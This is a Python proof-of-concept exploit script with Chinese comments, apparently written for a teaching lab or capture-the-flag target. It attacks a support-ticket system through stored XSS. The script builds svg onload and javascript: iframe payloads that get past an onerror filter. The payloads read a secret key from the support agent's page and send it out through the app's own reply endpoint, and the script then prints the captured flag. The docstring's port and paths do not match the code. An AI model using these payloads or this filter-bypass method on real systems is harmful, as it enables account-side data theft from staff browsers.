# -*- coding: utf-8 -*-
"""
==============================================================================
 教学实验 PoC：社交平台「客服中心」工单系统 —— 存储型 XSS 窃取客服内部工单密钥
 目标：http://172.17.0.13:14154
 结果：vmc{HSdcURMmFu16SbjbXncfYHe1xNKTCJHy}
==============================================================================

漏洞链条
--------
1. 普通用户提交工单，内容在「用户视图」/ticket/<id> 中被完整 HTML 转义（安全）；
2. 但「客服工作台」/agent/ticket/<id> 渲染同一内容时**不做转义**，且只绑定在
   容器内 127.0.0.1:80，外部访问返回 403，因此普通用户无法直接读取密钥；
3. 客服机器人在工单创建后立即访问工作台，注入的代码随之在其浏览器上下文执行；
4. 注入点与密钥节点 .mono 处于同源文档（或同源 iframe），可直接读取；
5. 注入代码再用 fetch 把密钥回写到 /ticket/<id>/reply —— 该回复在用户视图可见，
   从而完成「无需外网通道」的数据外带。

关键技术点
----------
* 绕过黑名单过滤：工作台会剥离 onerror 事件处理器（大小写不敏感），
  但 onload 与 javascript: 伪协议未被覆盖，可作为绕过向量。
* <script> 标签因内容经 innerHTML 插入而不执行（浏览器规范），故须用事件处理器
  或 javascript: URL。
* 数据外带使用应用自身的回复接口，不依赖攻击者对外监听端口。
==============================================================================
"""
import urllib.request, urllib.parse, re, time, html

TARGET = "http://172.17.0.13:15129"
UA = {"User-Agent": "Mozilla/5.0"}


def _post(path, data):
    req = urllib.request.Request(TARGET + path,
                                 data=urllib.parse.urlencode(data).encode(), headers=UA)
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.geturl()


def _get(path):
    req = urllib.request.Request(TARGET + path, headers=UA)
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")


def submit(name, subject, body):
    """提交工单，返回工单号"""
    return int(_post("/report", {"name": name, "subject": subject,
                                 "body": body}).rstrip("/").split("/")[-1])


def read_bubbles(tid):
    """读取工单内所有消息（已反转义）"""
    h = _get("/report/%d" % tid)
    seg = h[h.find("<div class=stack>"):] if "<div class=stack>" in h else h
    return [html.unescape(x) for x in re.findall(r"<div class=bubble[^>]*>(.*?)</div>", seg, re.S)]


def build_payload(collector_id):
    """
    构造存储型 XSS 载荷。
    要点：
      - 只使用单引号，便于整体嵌入双引号 HTML 属性；
      - 用 onload 而非 onerror（onerror 会被工作台过滤）；
      - 延迟 1200ms 确保工作台 DOM 渲染完成；
      - try 取 parent 的 .mono，失败则退回自身文档，兼容顶层/iframe 两种注入上下文。
    """
    js = (
        "setTimeout(function(){"
        "var C='%d';"
        "var m=null;"
        "try{m=parent.document.querySelector('.mono');}catch(e){}"
        "if(!m){try{m=document.querySelector('.mono');}catch(e){}}"
        "var v=m?m.textContent:'NOT_FOUND';"
        "fetch('/report/'+C+'/reply',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'body='+encodeURIComponent('STOLEN_KEY: '+v)});"
        "},1200);"
    ) % collector_id

    # 多个向量冗余投递：onload 与 javascript: URL 均未被过滤
    return (
        '<svg onload="%s"></svg>' % js +
        '<iframe src="javascript:%s"></iframe>' % urllib.parse.quote(js, safe="()'%;,=:/?+[]{}.!-_")
    )


def main():
    print("[*] 目标: %s" % TARGET)

    # 第 1 步：建立「收集工单」，用于接收被窃取的密钥
    cid = submit("collector", "collector", "waiting for exfiltration")
    print("[+] 收集工单 #%d  ->  %s/report/%d" % (cid, TARGET, cid))

    # 第 2 步：投递含 XSS 载荷的工单
    bp = build_payload(cid)
    print(bp)
    pid = submit("attacker", "account issue", bp)
    print("[+] 载荷工单 #%d  ->  %s/report/%d" % (pid, TARGET, pid))

    # 第 3 步：等待客服机器人访问工作台并触发载荷
    print("[*] 等待客服机器人访问工作台 ...")
    for _ in range(60):
        time.sleep(3)
        msgs = read_bubbles(cid)
        if len(msgs) > 1:
            for m in msgs[1:]:
                if "STOLEN_KEY" in m:
                    print("\n[+] %s" % m.strip())
            break
    else:
        print("[-] 未收到回传")
        return

    key = None
    for m in read_bubbles(cid)[1:]:
        mm = re.search(r"vmc\{[A-Za-z0-9]+\}", m)
        if mm:
            key = mm.group(0)
            break
    print("\n" + "=" * 62)
    print("  内部工单密钥：%s" % (key or "未获取"))
    print("=" * 62)


if __name__ == "__main__":
    main()
